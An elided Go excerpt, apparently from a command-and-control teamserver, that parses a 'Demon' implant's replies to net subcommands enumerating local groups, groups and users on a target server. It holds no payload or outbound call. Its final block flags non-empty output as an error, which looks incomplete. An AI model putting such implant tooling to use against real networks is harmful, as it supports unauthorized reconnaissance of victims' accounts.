			case DEMON_NET_COMMAND_LOCALGROUP:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					ServerName := Parser.ParseUTF16String()
					Output = fmt.Sprintf("Local groups at %s:\n\n", ServerName)
					Output += fmt.Sprintf(" %-40s %-40s\n", "Group Name", "Comment")
					...
					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
						...
						Comment := Parser.ParseUTF16String()
						Output += fmt.Sprintf(" %-40s %-40s\n", Name, Comment)
					}
				}
			...
			case DEMON_NET_COMMAND_GROUP:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					ServerName := Parser.ParseUTF16String()
					Output = fmt.Sprintf("Groups at %s:\n\n", ServerName)
					Output += fmt.Sprintf(" %-40s %-40s\n", "Group Name", "Comment")
					Output += fmt.Sprintf(" %-40s %-40s\n", strings.Repeat("-", 40), strings.Repeat("-", 40))
					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
						Name := Parser.ParseUTF16String()
			...
			case DEMON_NET_COMMAND_USERS:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					ServerName := Parser.ParseUTF16String()
					Output = fmt.Sprintf("Users at %s:\n\n", ServerName)
					Output += fmt.Sprintf(" %-40s\n", "Username")
					Output += fmt.Sprintf(" %-40s\n", strings.Repeat("-", 40))
					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32}) {
						Username := Parser.ParseUTF16String()
						_ = Parser.ParseInt32() // unused flag
						Output += fmt.Sprintf(" %-40s\n", Username)
					}
				}

			default:
				Output = fmt.Sprintf("Unknown net sub-command: %d", NetCommand)
			}
			...
			if len(Output) > 0 {
				...
				Message["Type"] = "Error"
				Message["Message"] = "Failed to parse net command response"
			}
